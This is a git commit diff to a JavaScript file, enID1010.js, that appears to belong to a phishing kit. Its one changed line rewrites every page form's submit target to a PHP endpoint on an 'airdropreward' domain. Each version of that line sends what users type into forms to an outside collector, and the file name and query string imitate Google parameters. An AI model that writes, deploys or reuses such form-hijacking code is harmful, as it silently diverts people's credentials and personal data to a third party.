dde7478853314dc832054b4060cb4595269ec53e
fiejuly87 <149322163+fiejuly87@users.noreply.github.com>
2023-11-10 23:18:45 +0700

    Update enID1010.js

--- enID1010.js
+++ enID1010.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://airdropreward.my.id/tumbuang/cirik.php?q=fgf&rlz=1C1CHWL_enID101");
+  $(myform).attr("action", "https://airdropreward.my.id/cirikbarandang/cirik.php?q=fgf&rlz=1C1CHWL_enID101");
 });
